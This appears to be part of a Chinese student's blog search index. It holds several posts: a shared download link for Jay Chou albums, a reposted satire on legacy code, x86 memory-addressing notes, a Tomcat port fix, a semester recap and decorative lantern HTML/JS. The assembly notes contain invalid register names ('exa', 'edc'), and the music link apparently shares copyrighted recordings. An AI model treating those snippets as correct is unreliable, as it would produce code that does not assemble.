      </categories>
      <tags>
        <tag>转载</tag>
        <tag>CTF</tag>
        <tag>隐写</tag>
      </tags>
  </entry>
  <entry>
    <title>一些小分享</title>
    <url>/article/39d7a96.html</url>
    <content><![CDATA[<font color="#856363" size="4" face="Open Sans">
好像没有写过分享类的文章，这里分享一些我jio得可以收藏一波的小东西。


<h3 id="周杰伦至今所有的专辑"><a href="#周杰伦至今所有的专辑" class="headerlink" title="周杰伦至今所有的专辑"></a>周杰伦至今所有的专辑</h3><p>哈哈，很久就想分享这个了，(我是杰伦粉(狂喜)，等疫情结束了，那我必要去看杰伦的演唱会)几乎包含了杰伦所有专辑上的所有的歌，一共分享了149首。<br><br>这里没有很系统地将所有专辑分类，其中还有一些翻唱。<br><br>另外，分享的这些基本上都是.wav格式，基本上每首歌都是在30~50M之间。<br><br>我用的是某易云，但是由于某易云的版权原因，基本上听不到Jay的歌，所以我都是上传到某易云云盘中去听，可以试试。但是分享的这些，随便一首歌就很大，如果在惜流量的话，建议还是不要这样做。<br><br>后续如果收集到.mp3格式的话，后续会加进来。<br><br>链接：<a href="https://pan.baidu.com/s/1vcwdETI_2-WBhswRJpLhmQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1vcwdETI_2-WBhswRJpLhmQ</a><br>提取码：2333<br></font></p>
]]></content>
      <categories>
        <category>日常</category>
      </categories>
  </entry>
  <entry>
    <title>为什么祖传代码会被称为屎山[转载]</title>
    <url>/article/f9c169d9.html</url>
    <content><![CDATA[<blockquote>
    原文链接:<a href="https://juejin.cn/post/6896312475390574599" target="_blank" rel="noopener">https://juejin.cn/post/6896312475390574599</a>
</blockquote>
<br>


<img src="https://qiniuyun.fxhstudy.com/%E4%B8%BA%E4%BB%80%E4%B9%88%E7%A5%96%E4%BC%A0%E4%BB%A3%E7%A0%81%E4%BC%9A%E8%A2%AB%E7%A7%B0%E4%B8%BA%E5%B1%8E%E5%B1%B1%5B%E8%BD%AC%E8%BD%BD%5D1.jpg" srcset="/img/loading.gif">

<br>
<br>

<p><font color="#856363" size="4" face="Open Sans"><b>有一天，有几条虫子，干扰了老板赚钱，老板希望你能抓住它们。</b></p>
</font>

<a id="more"></a>

<p><font color="#856363" size="4" face="Open Sans">你带着年轻的锐气，青春的活力，学艺多年积累的程序设计艺术，打开了公司的代码仓库。</p>
<p>远看，似乎一个运转的机器，巨大的代码堆积在一起形成了大致的轮廓，蠕动着前进。</p>
<p>凑近了一看，在不净的框架中，乱码般的语句在运转，像生了麻风病的蛞蝓一样在喷吐，粘稠的水在流动，而穿着格子衫的人群则在焰柱旁围成了一个半圆，这就是码农的仪式。</p>
<p>他们环绕着那不可名状植物，不断的伸手进去拨弄，又不断的掏出一些东西填上去，使他堆积的更高，为了防止到他，又掏出黏糊糊的糊糊，用力的涂抹，试图把它们黏在一起。</p>
<p>这是一个前人留下的屎堆起来的一个克苏鲁缝合怪，看起来摇摇欲坠，有无数的虫子爬来爬去。但勉强堆起了山一样的形体，蠕动着为老板赚钱。</p>
<div align="center"><img src="https://qiniuyun.fxhstudy.com/%E4%B8%BA%E4%BB%80%E4%B9%88%E7%A5%96%E4%BC%A0%E4%BB%A3%E7%A0%81%E4%BC%9A%E8%A2%AB%E7%A7%B0%E4%B8%BA%E5%B1%8E%E5%B1%B1%5B%E8%BD%AC%E8%BD%BD%5D.jpg" srcset="/img/loading.gif"></div>

<p>你满心热血，要对这座山进行清理，使它成为一个鲁棒的钢铁巨兽，可以随时更换最新的部件，奔腾如飞，坚固异常，带着兄弟们走向人生巅峰。</p>
<p>你经过缜密的分析，顺着虫子留下的痕迹，终于找到了问题的源头，发现一坨很多年前某码农因为时代局限或者水平有限拉的陈年旧屎。</p>
<p>你觉得只要对它改良一下，梳理清楚结构，加强判断与容错，就可以变化成一个钢铁部件，让这坨怪物离巨兽更近一步。</p>
<p>你用力的挖掘其中的信息，却发现，事情没有那么简单.</p>
<p>这一坨实际上不是孤立的一坨，而是和整个山体融合在一起。</p>
<p>或者说，这座山实际上是一坨坨粘稠滑腻的克苏鲁，通过无数的触角和粘液连接在了一起，这些克苏鲁伸出无数的触角，伸进这座山体中未知的角落。</p>
<p>有看起来结构相同，但是出现了几十上百次的重复逻辑。</p>
<p>有无数道不知道伸向何处的判断分支。</p>
<p>有七零八落到处都是又无法解释的神秘数字。</p>
<p>有从表面直接伸向最底层的神秘调用。</p>
<p>还有猜不出，看不懂，无法预计什么时候会触发，什么时候会爆发的无数定时器。</p>
<p>还有无数神秘的线程在独立的挂在那里，猜不出哪个什么时候会忽然启动，什么时候会忽然挂起，什么时候会忽然互相抢资源而死锁，哪些资源会莫名其妙的被改动。</p>
<p>神秘的链接，神秘的任务队列，神秘的池，神秘的环形缓存，神秘的堆栈。</p>
<p>他们耦合在一起，互相支撑，构成了一坨更大的克苏鲁屎怪，缓慢的蠕动。</p>
<p>你极其困难的清理和修改了其中的一点点内容，让这一点点的内容脱离出耦合态，看起来清晰一点。</p>
<p>结果，忽然屎山对面十万八千行外，你永远意想不到的一块功能，忽然挂了。</p>
<p>一个你完全在工作上没接触过的同事，通过他的盘查，发现是他维护的一个函数/方法、类、线程、内存块，池，和你改动的部分是深度耦合的，你的解耦导致了难以理解的错误使他们的部分产生了错误。</p>
<p>于是你被骂了.</p>
<p>你只能再退一步，在一个更小的范围内进行调整，但是发现，虫子不止是由这一块构成的，于是你追踪者虫子的足迹，去改良一个一个的模块。</p>
<p>在经历了一轮又一轮的批评，几乎结识了全公司所有模块的负责人之后，你终于抓住了一条虫子。</p>
<p>但是在这个漫长的过程中，你早已忘却初心。在无数次的赶工加班熬夜的迷糊中，被同事老板挨骂后的愤懑中，表白失败/和女朋友吵架/发现自己头顶有点绿的低落中；</p>
<p>无数次当做临时代码写下，计划单元测试完成后就重写却忘记的过程中，因为偷懒或者不舍得打断思路而而懒得抽出轮子而产生的超大代码块中。</p>
<p>留下了无数看起来结构相同，但是出现了几十上百次的重复逻辑。无数道不知道伸向何处的判断分支。大量的无法解释的神秘数字。从表面直接伸向最底层的神秘调用。</p>
<p>猜不出，看不懂，无法预计什么时候会触发，什么时候会爆发的无数定时器。</p>
<p>无数猜不出哪个什么时候会忽然启动，什么时候会忽然挂起，什么时候会忽然互相抢资源而死锁，莫名其妙改动资源的神秘线程。</p>
<p>神秘的链接，神秘的任务队列，神秘的池，神秘的环形缓存，神秘的堆栈。</p>
<p>你要抓的哪条虫子确实抓出来了。</p>
<p>然而，在你没看到的地方，随着运转，更多的新的虫子正在茁壮的成长。</p>
<p>这时，你突然发现你的脚抽不出来了，几条触手顺着你的腿向上攀延，你的手被深深地吸入泥沼一样的屎山，你使尽全力想要抽出胳膊，但越是挣扎，陷得越深，仿佛屎山中心有一个冰冷的黑洞，要将所有接近的物体吞噬殆尽。</p>
<p>你的精气在一点点流失，一种极度的疲惫，但是又释然的感觉涌了上来。</p>
<p>此刻，你觉得舒适又满足，渐渐地闭上了双眼，你甘愿奉献头发与生命，将自己化作一块补丁，维系着系统的苟延残喘。</p>
<p>再也没法离开你了，你和你的头发，成了它的一部分。</p>
<p>不知道过了多久……</p>
<p>终于又有一条虫子在运行中暴露，干扰了老板赚钱。</p>
<p>老板又安排了一个年轻人来抓住这条虫子。这个年轻人带着锐气，青春和活力来到这座山前。</p>
<p>看到这摇摇欲坠的克苏鲁大山，不仅倒吸一口冷气。</font></p>
<p><font size="5"><div align="center"><span style="max-width: 100%;color: rgb(254, 106, 0);">“oh shit ! shit mountain !”</span></div></font></p>
]]></content>
  </entry>
  <entry>
    <title>内存地址的五种形式</title>
    <url>/article/e4dfbb1b.html</url>
    <content><![CDATA[<p>这里写一下内存地址的五种读取内存的值和向内存中写入数据的方法，一方面对于初学汇编指令的人，还是有一定帮助的。<br>另一方面记录一下以后还可以翻回来复习一下。</p>
<h2 id="1、形式一：-立即数"><a href="#1、形式一：-立即数" class="headerlink" title="1、形式一：[立即数]"></a>1、形式一：[立即数]</h2><p>读取内存的地址：<br>mov exa,dword ptr ds:[0x13FFC4]</p>
<p>向内存中写入数据：<br>mov dword ptr ds:[0x13FFC4],eax</p>
<a id="more"></a>

<h2 id="2、形式二：-reg"><a href="#2、形式二：-reg" class="headerlink" title="2、形式二：[reg]"></a>2、形式二：[reg]</h2><p>reg代表寄存器 可以是8个通用寄存器中的任意一个</p>
<p>读取内存的值<br>mov ecx,0x13FFD0<br>mov eax,dword ptr ds:[ecx]</p>
<p>向内存中写入数据<br>mov ecx,0x13FFD0<br>mov dword ptr ds:[ecx],0x87654321</p>
<h2 id="3、形式三：-reg-立即数"><a href="#3、形式三：-reg-立即数" class="headerlink" title="3、形式三：[reg+立即数]"></a>3、形式三：[reg+立即数]</h2><p>读取内存的值：<br>mov ecx,0x13FFD0<br>mov eax,dword ptr ds:[ecx+4]</p>
<p>向内存中写入数据：<br>mov edx,0x13FFD0<br>mov dword ptr ds:[edc+0xC],0x87654321</p>
<h2 id="4、形式四：-reg-reg-1-2-4-8"><a href="#4、形式四：-reg-reg-1-2-4-8" class="headerlink" title="4、形式四：[reg+reg*(1,2,4,8}]"></a>4、形式四：[reg+reg*(1,2,4,8}]</h2><p>读取内存的值：<br>mov eax,13FFD0<br>mov ecx,2<br>mov edx,dword ptr ds:[eax+ecx*4]</p>
<p>向内存中写入数据：<br>mov eax,13FFD0<br>mov ecx,2<br>mov dword ptr ds:[eax+ecx*4],87654321</p>
<h2 id="5、形式五：-reg-reg-1-2-4-8-立即数"><a href="#5、形式五：-reg-reg-1-2-4-8-立即数" class="headerlink" title="5、形式五：[reg+reg*{1,2,4,8}+立即数]"></a>5、形式五：[reg+reg*{1,2,4,8}+立即数]</h2><p>读取内存的值：<br>mov eax,13FFD0<br>mov ecx,2<br>mov edx,dword ptr ds:[eax+ecx*4+4]</p>
<p>向内存中写入数据：<br>mov eax,13FFD0<br>mov ecx,2<br>mov dword ptr ds:[eax+ecx*4+4],87654321</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title>何为“大佬”</title>
    <url>/article/dd337093.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前一段时间关注了一个公众号：渗透云笔记，也是一位玩渗透的老哥。他的公众号里面分享着他渗透的思路和过程，还有一些学习资料，可以关注一波。<br>前几天读了他发表的一篇文章，感触还挺大的。这里我放上链接👉<a href="https://mp.weixin.qq.com/s/7GURAAqNRI6jN0SWCFc0CQ" target="_blank" rel="noopener" class="LinkCard">我的三观之就学习方法论</a></p>
<a id="more"></a>
<p>我喜欢文章里面的一句话，“追随着成功者的脚步  →  模仿成功者的行为  →  钻研成功者的行为   →   成为成功者   →  超越成功者。”</p>
<p>我觉的作者写的很好，我曾经看过一个表情包，一个人走到分岔路口前，分岔路口有两块标牌，一块标牌上面写着”百度一分钟”，另一块写着”群里吹B两小时”，这个人选择了后者。<br>极其讽刺的表情包，是啊，明明百度一分钟就能解决的问题，硬要问群里吹两小时牛逼。</p>
<p>再来到群里，对于他提的这些问题，你可能感觉很高深，感觉触不可及，会认为，哦，这是大佬，他问的这些我听都没听过，所以他是大佬。<br>这样看对吗？也对也不对，别人知道的比你多，所以，你可以称他为大佬，你会想去花时间去听他吹牛，看能不能从中学到什么；<br>但真正的大佬会浪费两小时去吹牛吗？答案可想而知。</p>
<p>我一直很认同一句话：闻道有先后，术业有专攻。你懂的比别人多，是因为你学的比别人早，你会的比别人深，是因为你从事这个行业。(这里指的是那些以为自己懂得比别人多了，就沾沾自喜，很浮躁的一类人)</p>
<p>何为”大佬”？<br>文章的作者，他把他的粉丝称为大佬，这位”大佬”甚至连Python都没学过，0基础，就这种人能称为大佬？<br>我愿称之为大佬，我也愿意向他学习，扪心自问，如果我学Python，我不可能专门去买材料，一步一练，很惭愧。这么一看，我还真是一个小白。</p>
<p>以前上过一堂公开课，里面的讲师说他以前在大学里面的学习情况，大二大三基本上都是一天睡三四个小时，其他的时间都是花费在渗透学习上。<br>我觉的这样的人才是大佬，你会觉得这种人会花费两个小时去群里，贴吧吹两个小时牛逼吗？<br>每个行业都会有高低之分的，一个行业，同样的知识，大家都会，但总会有佼佼者和垫底的，你的职业态度决定了你的高低。</p>
<p>再来看三年之后，是那个0基础的小白牛逼呢，还是那个经常吹水被称之为“大佬”的人会的多呢？五年之后呢？十年呢？<br>你品，你细品！</p>
<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>写的不好，没什么文化，将就着看吧</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>个人</tag>
      </tags>
  </entry>
  <entry>
    <title>几个小概念</title>
    <url>/article/daba9d83.html</url>
    <content><![CDATA[<p><font color="#856363" size="4" face="Open Sans">这些只是概念，具体解释和环境相关</p>
<p><font color="#856363" size="5" face="Open Sans">字段</font>：一般是指数据库表对象包含的内容</p>
<p><font color="#856363" size="5" face="Open Sans">属性</font>：指对象的成员变量</p>
<p><font color="#856363" size="5" face="Open Sans">常量</font>：字符串直接量或值不变的变量，如 数字5，字符’a’ 或者  String  a = “123”等</p>
<p><font color="#856363" size="5" face="Open Sans">变量</font>：值不定或可能会发生变化的对象，如 String a;</p>
<p>   比如数据库有 “圆”这样一张表，那么“半径”就可以是表字段</p>
<p>   对应的有“圆”这样对象的话，“半径”也可以是对象的属性</p>
<p>   圆周率π 是和圆相关的常量 </p>
<p>   圆的直径 可以是变量<br></font></p>
]]></content>
  </entry>
  <entry>
    <title>原码反码和补码</title>
    <url>/article/2526b7ad.html</url>
    <content><![CDATA[<p>很早就学过原码反码和补码了，但一直没有接触这种偏底层的，然后就忘了，<br>多的细节就不说了，直接记录一下怎么定义的，这东西不难，但不总结容易忘。</p>
<p>原码：最高位是符号位，其余各位为数值本身的绝对值</p>
<p>反码：<br>&emsp;正数：反码与原码相同<br>&emsp;负数：符号位为1，其余位对原码取反</p>
<p>补码：<br>&emsp;正数：补码与原码相同<br>&emsp;负数：符号位为1，其余位对原码取反加1</p>
<p>假设数据宽度为 1BYTE（8BIT）<br>&emsp;无符号数：0 1 2 3 4 ……FF（10进制255）<br>&emsp;有符号数：<br>&emsp;&emsp;正数：0……7F<br>&emsp;&emsp;负数：FF……80       （FF即为-1）</p>
]]></content>
      <tags>
        <tag>小知识点</tag>
      </tags>
  </entry>
  <entry>
    <title>启动tomcat时,端口占用的解决办法</title>
    <url>/article/2f4c50c2.html</url>
    <content><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>今天在用IDEA打开Tomcat的时候，出了点意外，</p>
<p><font color="#FF6B68">错误: 代理抛出异常 : java.rmi.server.ExportException: Port already in use: 1099</font></p>
<p>查了一下资料，这里是因为1099端口被其他进程占用了，需要杀死占用这个端口号的其他进程</p>
<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>终端中输入 </p>
<p><code>netstat -ano|findstr 1099</code> </p>
<p>找到PID，结束进程</p>
<p><code>taskkill -f -pid xxxx(这里是你的PID)</code></p>
<p>然后就可以正常启动Tomcat了。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/xdp-gacl/p/5288399.html" target="_blank" rel="noopener" class="LinkCard">启动tomcat时 错误: 代理抛出异常 : java.rmi.server.ExportException: Port already in use: 1099的解决办法</a></p>
]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>大二下的总结</title>
    <url>/article/88b82023.html</url>
    <content><![CDATA[<p><font color="#856363" size="4" face="Open Sans"><b></p>
<p>很久没有更新了，前一段时间因为要准备期末考试，所以精力都花在了复习上面。考完试之后又匆匆回来，按照优先级，关于博客的事情就放到了后面。</p>
<p>这篇博客想要总结一下，我在大二下学期的学的东西和参加的一些比赛。</p>
<h2 id="关于学习"><a href="#关于学习" class="headerlink" title="关于学习"></a>关于学习</h2><h4 id="1-专业课"><a href="#1-专业课" class="headerlink" title="1.专业课"></a>1.专业课</h4><p>我们大二下学了的专业课有Java，数据库。与计算机有关的是这两个，至于离散数学我就没有放进去了。总的看来，我这一学期Java和数据库上课都不是很认真，因为之前已经学过有关于这方面的知识点了，所以基本上上课也没怎么听讲(不过u1s1,我们学校老师教的确实不怎么样，所以大都靠自己学)。</p>
<h4 id="2-四六级"><a href="#2-四六级" class="headerlink" title="2.四六级"></a>2.四六级</h4><p>大二下考了六级，因为正赶上计算机设计大赛吗，时间很冲突，就没有准备，裸考的。。。不知道能不能过，其实也没有希望一次过。这个暑假要好好准备英语了，不管是为了六级还是考研，英语都要开始准备了。</p>
<h4 id="3-自己学的"><a href="#3-自己学的" class="headerlink" title="3.自己学的"></a>3.自己学的</h4><p>自己学的就比较多了，web的后端的开发、还有Vue前端框架，Vue前端框架我学的还不很懂，数据呈现这一块我还是有点问题的。后端的开发包括的东西就很多了，Mysql数据库、JDBC连接、html、js、xml、tomcat、然后什么Linux都需要去学习还挺多的，之后web开发的话，不仅仅需要后端，前端你还要实现怎么呈现，就涉及到Vue、LayUI前端的框架也要懂一些。比如这次我们参加的是软件应用与开发中的信息管理系统，就涉及到了web的知识。所以web的开发啥的都要理解，并且我们用了Spring boot框架，然后你就必须要理解web开发的大致流程，以及怎么样使用spring boot框架、怎么使用数据库、界面怎么设计(当然这一块是我学长负责的)。<br>幸亏有一些基础，要不然真的就凉凉了。<br>还有看了几本书《图解http》、《图解TCP》、《深入理解计算机系统》，计算机系统还没有看完，因为书太厚了，时间没那么多。</p>
<h2 id="关于竞赛"><a href="#关于竞赛" class="headerlink" title="关于竞赛"></a>关于竞赛</h2><h4 id="1-计算机设计大赛"><a href="#1-计算机设计大赛" class="headerlink" title="1.计算机设计大赛"></a>1.计算机设计大赛</h4><p>这个比赛的话其实比较偏向于创新，我大二上的时候有参加网络安全攻防赛，那个是纯靠个人能力的，要求技术性很强。<br>但计算机设计大赛的话，虽然技术性要求也很强，但是它关注的是你们创新点，就是新颖的地方。拿我们这次来讲，我们做的是一款养老互助管理系统，就是实现与老人互助的系统，题材还行，互助这一块比较新颖，然后因为国家老龄化这一块也日渐严重，所以不是很吃亏。在省赛阶段，我们取得了省一，名次还是比较好的。然后接下来的国赛是在这个月的22到24号举行，采用线上答辩，以为还可以去上海一日游呢。桑心:-(</p>
<h4 id="2-大数据人工与智能"><a href="#2-大数据人工与智能" class="headerlink" title="2.大数据人工与智能"></a>2.大数据人工与智能</h4><p>这个比赛就是参加的校赛，然后取得了二等奖的名次，其实就是手写一些题目,我会的也就是一些数据库的增删改查，毕竟专业也不对口嘛。<br>但是学姐邀请了我参加这个，下学期还有省赛，因为有涉及到Java部分和环境的搭建，所以我也是可以参加的。至于能不能在省赛拿到一个好名次，就不知道了。</p>
<p>关于竞赛大概就这么多，下学期感觉时间有点不太够用，网络安全攻防赛、作品赛、大数据人工与智能，还有一个ACM(这个放弃了，时间真的不多了)</p>
<h2 id="关于生活"><a href="#关于生活" class="headerlink" title="关于生活"></a>关于生活</h2><p>生活方面没什么，但是长胖了一些，暑假要开始锻炼了。</p>
<h2 id="关于暑假"><a href="#关于暑假" class="headerlink" title="关于暑假"></a>关于暑假</h2><p>暑假嘛，我其实还挺矛盾的，我看这周围的人都开始准备考研了，但是我们其实才大二下结束，按道理来讲应该明年二月开始准备。<br>我其实还挺想多巩固巩固web开发，然后机组也想看看，英语看看，还要准备国赛、作品赛。。。md，感觉时间真的不太够。</p>
<p></b></font></p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>个人</tag>
      </tags>
  </entry>
  <entry>
    <title>好用的JS代码</title>
    <url>/article/c2decd56.html</url>
    <content><![CDATA[<h2 id="春节灯笼"><a href="#春节灯笼" class="headerlink" title="春节灯笼"></a>春节灯笼</h2><p class="note note-success">
    放入head文件中即可实现春节灯笼<br>
    < script src="https://cdn.jsdelivr.net/gh/lz1473/test@master/jscss/script/dl_2.js"> < /script>    <br>
</p>

<p>效果图</p>
<p><img src="https://qiniuyun.fxhstudy.com/%E5%A5%BD%E7%94%A8%E7%9A%84JS%E4%BB%A3%E7%A0%81.png" srcset="/img/loading.gif" alt="效果图"></p>
<p>或者将下列代码放入head文件中</p>
<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">&lt;!-- 灯笼代码 --&gt;<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"deng-box2"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"deng"</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"xian"</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"deng-a"</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"deng-b"</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"deng-t"</span>&gt;</span>年<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"shui shui-a"</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"shui-c"</span>&gt;</span><br><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"shui-b"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"deng-box3"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"deng"</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"xian"</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"deng-a"</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"deng-b"</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"deng-t"</span>&gt;</span>新<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span 